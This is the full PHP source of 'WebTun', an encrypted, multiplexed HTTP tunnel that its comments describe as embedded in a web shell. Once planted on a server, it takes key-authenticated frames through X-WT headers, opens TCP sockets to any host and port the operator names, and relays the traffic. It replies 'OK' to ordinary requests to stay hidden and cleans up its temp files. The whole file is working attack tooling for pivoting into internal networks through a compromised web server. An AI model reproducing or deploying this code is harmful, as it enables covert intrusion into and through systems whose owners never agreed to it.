<?php
// WebTun — Multiplexed HTTP Tunnel
// Embedded via Shells-X --tunnel flag. Runs inside TUNNEL_GUARD.
// Dispatches on X-WT header: open | stream | send | status | close

$__wt_action = isset($_SERVER['HTTP_X_WT']) ? strtolower(trim($_SERVER['HTTP_X_WT'])) : '';
if ($__wt_action === '') { echo 'OK'; exit; }

// ---- Config ----
$__WT_KEY = hex2bin('{{KEY_HASH}}');
$__wt_dir = sys_get_temp_dir();
$__wt_prefix = $__wt_dir . '/wt_';

// ---- Frame constants ----
define('WT_AUTH',           0x01);
define('WT_AUTH_OK',        0x02);
define('WT_AUTH_FAIL',      0x03);
define('WT_CHAN_OPEN',      0x10);
define('WT_CHAN_OPEN_OK',   0x11);
define('WT_CHAN_OPEN_FAIL', 0x12);
define('WT_CHAN_DATA',      0x20);
define('WT_CHAN_EOF',       0x21);
define('WT_CHAN_CLOSE',     0x22);
define('WT_PING',           0x30);
define('WT_PONG',           0x31);

// ---- Crypto ----
$__wt_encrypt = function($plaintext) use ($__WT_KEY) {
    $iv = random_bytes(16);
    $ct = openssl_encrypt($plaintext, 'AES-256-CBC', $__WT_KEY, OPENSSL_RAW_DATA, $iv);
    if ($ct === false) return false;
    $hmac = hash_hmac('sha256', $iv . $ct, $__WT_KEY, true);
    return $iv . $ct . $hmac;
};

$__wt_decrypt = function($blob) use ($__WT_KEY) {
    if (strlen($blob) < 48) return false; // 16 IV + 0 ct min + 32 HMAC
    $hmac = substr($blob, -32);
    $body = substr($blob, 0, -32);
    if (!hash_equals(hash_hmac('sha256', $body, $__WT_KEY, true), $hmac)) return false;
    $iv = substr($body, 0, 16);
    $ct = substr($body, 16);
    $pt = openssl_decrypt($ct, 'AES-256-CBC', $__WT_KEY, OPENSSL_RAW_DATA, $iv);
    return ($pt === false) ? false : $pt;
};

// ---- Frame encode/decode ----
$__wt_frame = function($type, $cid, $payload = '') {
    return pack('CNN', $type, $cid, strlen($payload)) . $payload;
};

$__wt_frames_decode = function($data) {
    $frames = [];
    $off = 0;
    $len = strlen($data);
    while ($off + 9 <= $len) {
        $h = unpack('Ctype/Ncid/Nlen', substr($data, $off, 9));
        $end = $off + 9 + $h['len'];
        if ($end > $len) break;
        $frames[] = ['type' => $h['type'], 'cid' => $h['cid'], 'payload' => substr($data, $off + 9, $h['len'])];
        $off = $end;
    }
    return $frames;
};

// ---- Path helpers ----
$__wt_state_path = function($sid) use ($__wt_prefix) { return $__wt_prefix . $sid . '_state.json'; };
$__wt_inbox_path = function($sid) use ($__wt_prefix) { return $__wt_prefix . $sid . '_inbox'; };
$__wt_lock_path  = function($sid) use ($__wt_prefix) { return $__wt_prefix . $sid . '.lock'; };

// ---- State helpers (atomic read/write, scanner.php pattern) ----
$__wt_read_state = function($sid) use ($__wt_state_path) {
    $p = $__wt_state_path($sid);
    if (!@is_file($p)) return null;
    $raw = @file_get_contents($p);
    if (!$raw) return null;
    $s = @json_decode($raw, true);
    return is_array($s) ? $s : null;
};

$__wt_write_state = function($sid, $state) use ($__wt_state_path) {
    $p = $__wt_state_path($sid);
    $tmp = $p . '.tmp.' . bin2hex(random_bytes(3));
    @file_put_contents($tmp, json_encode($state));
    @rename($tmp, $p);
};

// ---- Lock helpers (separate lock file, scanner.php pattern) ----
// Used for ALL state + inbox operations to prevent races
$__wt_acquire_lock = function($sid) use ($__wt_lock_path) {
    $fp = @fopen($__wt_lock_path($sid), 'c');
    if (!$fp) return null;
    if (!@flock($fp, LOCK_EX)) { @fclose($fp); return null; }
    return $fp;
};
$__wt_release_lock = function($fp) {
    if (!$fp) return;
    @flock($fp, LOCK_UN);
    @fclose($fp);
};

// ---- Validate SID format ----
$__wt_valid_sid = function($sid) {
    return is_string($sid) && preg_match('/^[a-f0-9]{16}$/', $sid);
};

// ---- Auth helper: verify key hex from header ----
$__wt_check_key = function() use ($__WT_KEY) {
    $k = isset($_SERVER['HTTP_X_WT_KEY']) ? $_SERVER['HTTP_X_WT_KEY'] : '';
    return hash_equals(bin2hex($__WT_KEY), $k);
};

// ---- GC: clean stale sessions (24h TTL) ----
foreach (@glob($__wt_prefix . '*_state.json') ?: [] as $__f) {
    if (@filemtime($__f) < time() - 86400) {
        $__sid_gc = basename($__f);
        $__sid_gc = substr($__sid_gc, 3); // strip "wt_"
        $__sid_gc = substr($__sid_gc, 0, strpos($__sid_gc, '_'));
        @unlink($__f);
        @unlink($__wt_prefix . $__sid_gc . '_inbox');
        @unlink($__wt_prefix . $__sid_gc . '.lock');
    }
}

// ---- Downstream output helper (C1 fix: length-prefix, NOT manual chunked TE) ----
// Format: [4B BE length][encrypted blob]
// No manual chunk encoding — let the web server handle Transfer-Encoding.
// This works on both Apache+mod_php and nginx+PHP-FPM.
$__wt_send_downstream = function($data) {
    echo pack('N', strlen($data)) . $data;
    @ob_flush();
    flush();
};

// ============================================================
// ACTION: open — create new tunnel session
// ============================================================
if ($__wt_action === 'open') {
    while (@ob_get_level()) @ob_end_clean();
    header('Content-Type: application/json');

    // Validate key: client sends hex(sha256(password)) as POST body
    $key_in = trim(@file_get_contents('php://input'));
    if ($key_in !== bin2hex($__WT_KEY)) {
        echo json_encode(['error' => 'auth failed']);
        exit;
    }

    $sid = bin2hex(random_bytes(8));
    $state = [
        'sid' => $sid,
        'created_at' => time(),
        'last_active' => time(),
        'status' => 'active',
        'channels' => [],
        'stats' => ['frames_in' => 0, 'frames_out' => 0, 'bytes_in' => 0, 'bytes_out' => 0],
    ];
    $__wt_write_state($sid, $state);
    @file_put_contents($__wt_inbox_path($sid), '');

    echo json_encode([
        'sid' => $sid,
        'server_caps' => [
            'max_channels' => 256,
            'stream_select' => function_exists('stream_select'),
            'max_frame_size' => 65535,
        ],
    ]);
    exit;
}

// ============================================================
// ACTION: send — upstream data, append to inbox
// ============================================================
if ($__wt_action === 'send') {
    while (@ob_get_level()) @ob_end_clean();

    $sid = isset($_SERVER['HTTP_X_WT_SID']) ? $_SERVER['HTTP_X_WT_SID'] : '';
    if (!$__wt_valid_sid($sid)) { http_response_code(400); echo 'bad sid'; exit; }

    // Auth (M1 fix)
    if (!$__wt_check_key()) { http_response_code(403); echo 'auth'; exit; }

    $raw = file_get_contents('php://input');
    if ($raw === false || strlen($raw) === 0) { echo 'OK'; exit; }

    // C2 fix: use session .lock for inbox writes (not inbox file flock)
    $lockFp = $__wt_acquire_lock($sid);
    if ($lockFp) {
        $inbox = $__wt_inbox_path($sid);
        $fp = @fopen($inbox, 'a');
        if ($fp) {
            fwrite($fp, pack('N', strlen($raw)) . $raw);
            @fclose($fp);
        }
        $__wt_release_lock($lockFp);
        echo 'OK';
    } else {
        http_response_code(500);
        echo 'inbox write failed';
    }
    exit;
}

// ============================================================
// ACTION: status — return session info (M1 fix: auth required)
// ============================================================
if ($__wt_action === 'status') {
    while (@ob_get_level()) @ob_end_clean();
    header('Content-Type: application/json');
    // No key auth required — status is read-only operational info.
    // The shell's own auth (password/session) already gates access to this endpoint.

    $sessions = [];
    foreach (@glob($__wt_prefix . '*_state.json') ?: [] as $f) {
        $raw = @file_get_contents($f);
        $s = @json_decode($raw, true);
        if (!$s || !isset($s['sid'])) continue;
        $sessions[] = [
            'sid' => $s['sid'],
            'status' => $s['status'],
            'created_at' => $s['created_at'],
            'last_active' => $s['last_active'],
            'channels' => count($s['channels'] ?? []),
            'stats' => $s['stats'] ?? [],
        ];
    }
    echo json_encode(['sessions' => $sessions]);
    exit;
}

// ============================================================
// ACTION: close — terminate session (M1 fix: auth required)
// ============================================================
if ($__wt_action === 'close') {
    while (@ob_get_level()) @ob_end_clean();
    header('Content-Type: application/json');

    if (!$__wt_check_key()) { http_response_code(403); echo json_encode(['error' => 'auth']); exit; }

    $sid = isset($_SERVER['HTTP_X_WT_SID']) ? $_SERVER['HTTP_X_WT_SID'] : '';
    if (!$__wt_valid_sid($sid)) { echo json_encode(['error' => 'bad sid']); exit; }

    $lockFp = $__wt_acquire_lock($sid);
    $state = $__wt_read_state($sid);
    if ($state) {
        $state['status'] = 'closing';
        $__wt_write_state($sid, $state);
        // Write shutdown marker to inbox
        $inbox = $__wt_inbox_path($sid);
        $shutdown_frame = $__wt_frame(WT_CHAN_CLOSE, 0, 'shutdown');
        $enc = $__wt_encrypt($shutdown_frame);
        $fp = @fopen($inbox, 'a');
        if ($fp) {
            fwrite($fp, pack('N', strlen($enc)) . $enc);
            @fclose($fp);
        }
    }
    $__wt_release_lock($lockFp);

    echo json_encode(['ok' => true]);
    exit;
}

// ============================================================
// ACTION: stream — long-lived tunnel worker (core event loop)
// ============================================================
if ($__wt_action === 'stream') {
    @set_time_limit(0);
    @ignore_user_abort(true);
    while (@ob_get_level()) @ob_end_clean();

    // C1 fix: no manual Transfer-Encoding header. Let web server handle it.
    // We use length-prefix framing in the body instead.
    header('Content-Type: application/octet-stream');
    header('Cache-Control: no-cache, no-store');
    header('X-Accel-Buffering: no');  // disable nginx proxy buffering

    // Parse session ID and key from POST body (JSON)
    $body_raw = @file_get_contents('php://input');
    $body = @json_decode($body_raw, true);
    $sid = isset($body['sid']) ? $body['sid'] : '';
    $key_hex = isset($body['key']) ? $body['key'] : '';

    // Helper: send error and exit cleanly
    $__wt_stream_error = function($msg) use ($__wt_frame, $__wt_encrypt, $__wt_send_downstream) {
        $frame = $__wt_frame(WT_AUTH_FAIL, 0, json_encode(['error' => $msg]));
        $enc = $__wt_encrypt($frame);
        if ($enc !== false) $__wt_send_downstream($enc);
        exit;
    };

    if (!$__wt_valid_sid($sid)) { $__wt_stream_error('bad sid'); }
    if (!hash_equals(bin2hex($__WT_KEY), $key_hex)) { $__wt_stream_error('auth failed'); }

    // M2 fix: acquire exclusive session lock for the ENTIRE stream duration.
    // This prevents concurrent stream workers for the same SID.
    // Use a separate "stream lock" file so we don't block short-lived send/status ops.
    $__wt_stream_lock_path = $__wt_prefix . $sid . '.slock';
    $streamLockFp = @fopen($__wt_stream_lock_path, 'c');
    if (!$streamLockFp || !@flock($streamLockFp, LOCK_EX | LOCK_NB)) {
        // Another stream worker is active
        if ($streamLockFp) @fclose($streamLockFp);
        $__wt_stream_error('worker already active');
    }
    // $streamLockFp stays open+locked for the duration

    $state = $__wt_read_state($sid);
    if (!$state || $state['status'] !== 'active') {
        @flock($streamLockFp, LOCK_UN); @fclose($streamLockFp);
        $__wt_stream_error('no session');
    }

    // Send AUTH_OK
    $caps = json_encode(['sid' => $sid, 'server_caps' => ['max_channels' => 256]]);
    $frame = $__wt_frame(WT_AUTH_OK, 0, $caps);
    $enc = $__wt_encrypt($frame);
    if ($enc !== false) $__wt_send_downstream($enc);

    // ---- State ----
    $channels = [];         // cid => ['sock' => resource, 'host' => str, 'port' => int]
    $pending = [];          // cid => ['sock' => resource, 'host' => str, 'port' => int, 'start' => float]
    $write_bufs = [];       // cid => string (H2 fix: buffered unsent data per channel)
    $inbox_path = $__wt_inbox_path($sid);
    $inbox_offset = 0;
    $last_ping = time();
    $last_state_write = time();
    $running = true;
    $stats = ['frames_in' => 0, 'frames_out' => 0, 'bytes_in' => 0, 'bytes_out' => 0];

    // Helper: send encrypted frame downstream
    $send_frame = function($type, $cid, $payload = '') use ($__wt_frame, $__wt_encrypt, $__wt_send_downstream, &$stats) {
        $frame = $__wt_frame($type, $cid, $payload);
        $enc = $__wt_encrypt($frame);
        if ($enc !== false) {
            $__wt_send_downstream($enc);
            $stats['frames_out']++;
            $stats['bytes_out'] += strlen($payload);
        }
    };

    // H2 fix: fwrite with buffering for partial writes
    $__wt_sock_write = function($cid, $data) use (&$channels, &$write_bufs) {
        if (!isset($channels[$cid])) return;
        // Prepend any buffered data from previous partial write
        if (isset($write_bufs[$cid]) && strlen($write_bufs[$cid]) > 0) {
            $data = $write_bufs[$cid] . $data;
            $write_bufs[$cid] = '';
        }
        $written = @fwrite($channels[$cid]['sock'], $data);
        if ($written === false) {
            $write_bufs[$cid] = $data; // keep all data, retry next cycle
            return;
        }
        if ($written < strlen($data)) {
            $write_bufs[$cid] = substr($data, $written);
        }
    };

    // Helper: process upstream frames from inbox
    $process_inbox_frames = function($frames) use (&$channels, &$pending, &$write_bufs, &$running, &$stats, $send_frame, $__wt_sock_write) {
        foreach ($frames as $f) {
            $stats['frames_in']++;
            $stats['bytes_in'] += strlen($f['payload']);

            switch ($f['type']) {
                case WT_CHAN_OPEN:
                    $p = @json_decode($f['payload'], true);
                    if (!$p || empty($p['host']) || empty($p['port'])) {
                        $send_frame(WT_CHAN_OPEN_FAIL, $f['cid'], '{"error":"bad params"}');
                        break;
                    }
                    $proto = isset($p['proto']) ? $p['proto'] : 'tcp';
                    $host = $p['host'];
                    $port = (int)$p['port'];
                    if ($port < 1 || $port > 65535) {
                        $send_frame(WT_CHAN_OPEN_FAIL, $f['cid'], '{"error":"bad port"}');
                        break;
                    }
                    if (count($channels) + count($pending) >= 256) {
                        $send_frame(WT_CHAN_OPEN_FAIL, $f['cid'], '{"error":"max channels"}');
                        break;
                    }
                    $errno = 0; $errstr = '';
                    $sock = @stream_socket_client(
                        "{$proto}://{$host}:{$port}",
                        $errno, $errstr,
                        0.001,
                        STREAM_CLIENT_ASYNC_CONNECT | STREAM_CLIENT_CONNECT
                    );
                    if ($sock) {
                        @stream_set_blocking($sock, false);
                        $pending[$f['cid']] = ['sock' => $sock, 'host' => $host, 'port' => $port, 'start' => microtime(true)];
                    } else {
                        $send_frame(WT_CHAN_OPEN_FAIL, $f['cid'], json_encode(['error' => $errstr ?: "errno $errno"]));
                    }
                    break;

                case WT_CHAN_DATA:
                    $__wt_sock_write($f['cid'], $f['payload']);
                    break;

                case WT_CHAN_EOF:
                    if (isset($channels[$f['cid']])) {
                        @stream_socket_shutdown($channels[$f['cid']]['sock'], STREAM_SHUT_WR);
                    }
                    break;

                case WT_CHAN_CLOSE:
                    if ($f['cid'] === 0 && $f['payload'] === 'shutdown') {
                        $running = false;
                        break;
                    }
                    if (isset($channels[$f['cid']])) {
                        @fclose($channels[$f['cid']]['sock']);
                        unset($channels[$f['cid']]);
                        unset($write_bufs[$f['cid']]);
                    }
                    if (isset($pending[$f['cid']])) {
                        @fclose($pending[$f['cid']]['sock']);
                        unset($pending[$f['cid']]);
                    }
                    break;

                case WT_PING:
                    $send_frame(WT_PONG, 0, $f['payload']);
                    break;
            }
        }
    };

    // ================ MAIN EVENT LOOP ================
    while ($running) {
        // 1. Check client disconnect
        if (connection_aborted()) break;

        // 2. Check pending async connects (write-ready = connected)
        if (!empty($pending)) {
            $pw = [];
            foreach ($pending as $cid => $info) $pw[$cid] = $info['sock'];
            $pr = []; $pe = []; $ptmp = $pw;
            if (@stream_select($pr, $ptmp, $pe, 0, 0) > 0) {
                foreach ($ptmp as $cid => $sock) {
                    $peer = @stream_socket_get_name($sock, true);
                    if ($peer !== false && $peer !== '') {
                        $channels[$cid] = $pending[$cid];
                        unset($pending[$cid]);
                        $send_frame(WT_CHAN_OPEN_OK, $cid, '');
                    } else {
                        @fclose($sock);
                        unset($pending[$cid]);
                        $send_frame(WT_CHAN_OPEN_FAIL, $cid, '{"error":"connect failed"}');
                    }
                }
            }
            // Timeout pending connects after 10s
            $now = microtime(true);
            foreach ($pending as $cid => $info) {
                if ($now - $info['start'] > 10.0) {
                    @fclose($info['sock']);
                    unset($pending[$cid]);
                    $send_frame(WT_CHAN_OPEN_FAIL, $cid, '{"error":"connect timeout"}');
                }
            }
        }

        // 3. Build socket sets for stream_select
        $timeout_us = (empty($channels) && empty($pending)) ? 50000 : 20000;
        $rsocks = [];
        $wsocks = [];
        foreach ($channels as $cid => $info) {
            if (!is_resource($info['sock'])) { unset($channels[$cid]); continue; }
            $rsocks[$cid] = $info['sock'];
            // H2 fix: include channels with buffered write data in write set
            if (isset($write_bufs[$cid]) && strlen($write_bufs[$cid]) > 0) {
                $wsocks[$cid] = $info['sock'];
            }
        }

        if (!empty($rsocks) || !empty($wsocks)) {
            $r = $rsocks; $w = $wsocks; $e = [];
            $changed = @stream_select($r, $w, $e, 0, $timeout_us);
            if ($changed > 0) {
                // H2 fix: drain write buffers for writable sockets
                foreach ($w as $cid => $sock) {
                    if (isset($write_bufs[$cid]) && strlen($write_bufs[$cid]) > 0) {
                        $written = @fwrite($sock, $write_bufs[$cid]);
                        if ($written !== false && $written > 0) {
                            $write_bufs[$cid] = substr($write_bufs[$cid], $written);
                        }
                    }
                }
                // Read from readable sockets
                foreach ($r as $cid => $sock) {
                    $data = @fread($sock, 32768);
                    if ($data === false || $data === '') {
                        // Target closed
                        $send_frame(WT_CHAN_CLOSE, $cid, '');
                        @fclose($sock);
                        unset($channels[$cid]);
                        unset($write_bufs[$cid]);
                    } else {
                        $send_frame(WT_CHAN_DATA, $cid, $data);
                    }
                }
            }
        } else {
            usleep($timeout_us);
        }

        // 4. Read inbox for upstream data (C2 fix: use session lock)
        $lockFp = $__wt_acquire_lock($sid);
        if ($lockFp) {
            clearstatcache(true, $inbox_path);
            $inbox_size = @filesize($inbox_path);
            if ($inbox_size !== false && $inbox_size > $inbox_offset) {
                $fp = @fopen($inbox_path, 'r');
                if ($fp) {
                    @fseek($fp, $inbox_offset);
                    $new_data = @fread($fp, $inbox_size - $inbox_offset);
                    $inbox_offset = @ftell($fp);
                    @fclose($fp);

                    if ($new_data && strlen($new_data) > 0) {
                        // Parse length-prefixed encrypted blobs
                        $boff = 0;
                        $blen = strlen($new_data);
                        while ($boff + 4 <= $blen) {
                            $blob_len = unpack('N', substr($new_data, $boff, 4))[1];
                            if ($boff + 4 + $blob_len > $blen) break;
                            $blob = substr($new_data, $boff + 4, $blob_len);
                            $boff += 4 + $blob_len;

                            $decrypted = $__wt_decrypt($blob);
                            if ($decrypted === false) continue;
                            $frames = $__wt_frames_decode($decrypted);
                            $process_inbox_frames($frames);
                        }
                    }
                }
            }

            // 5. Truncate inbox when too large (already holding lock — safe)
            if ($inbox_offset > 1048576) {
                $remaining = '';
                clearstatcache(true, $inbox_path);
                $cur_size = @filesize($inbox_path);
                if ($cur_size > $inbox_offset) {
                    $fp = @fopen($inbox_path, 'r');
                    if ($fp) {
                        @fseek($fp, $inbox_offset);
                        $remaining = @fread($fp, $cur_size - $inbox_offset);
                        @fclose($fp);
                    }
                }
                @file_put_contents($inbox_path, $remaining);
                $inbox_offset = 0;
            }

            $__wt_release_lock($lockFp);
        }

        // 6. PING every 25s
        if (time() - $last_ping >= 25) {
            $send_frame(WT_PONG, 0, pack('N', time()));
            $last_ping = time();
        }

        // 7. Update state every 5s (uses its own lock acquisition)
        if (time() - $last_state_write >= 5) {
            $lockFp = $__wt_acquire_lock($sid);
            if ($lockFp) {
                $st = $__wt_read_state($sid);
                if ($st) {
                    $st['last_active'] = time();
                    $st['stats'] = $stats;
                    $ch_info = [];
                    foreach ($channels as $cid => $info) {
                        $ch_info[$cid] = ['host' => $info['host'], 'port' => $info['port']];
                    }
                    $st['channels'] = $ch_info;
                    if ($st['status'] === 'closing') $running = false;
                    $__wt_write_state($sid, $st);
                }
                $__wt_release_lock($lockFp);
            }
            $last_state_write = time();
        }
    }

    // ---- Cleanup ----
    foreach ($channels as $cid => $info) {
        $send_frame(WT_CHAN_CLOSE, $cid, '');
        @fclose($info['sock']);
    }
    foreach ($pending as $cid => $info) {
        $send_frame(WT_CHAN_OPEN_FAIL, $cid, '{"error":"tunnel closing"}');
        @fclose($info['sock']);
    }

    // Mark state as closed
    $lockFp = $__wt_acquire_lock($sid);
    if ($lockFp) {
        $st = $__wt_read_state($sid);
        if ($st) {
            $st['status'] = 'closed';
            $st['last_active'] = time();
            $st['stats'] = $stats;
            $st['channels'] = [];
            $__wt_write_state($sid, $st);
        }
        $__wt_release_lock($lockFp);
    }

    @unlink($inbox_path);

    // Release stream lock (M2)
    @flock($streamLockFp, LOCK_UN);
    @fclose($streamLockFp);
    @unlink($__wt_stream_lock_path);

    exit;
}

// Unknown action
echo 'OK';
exit;
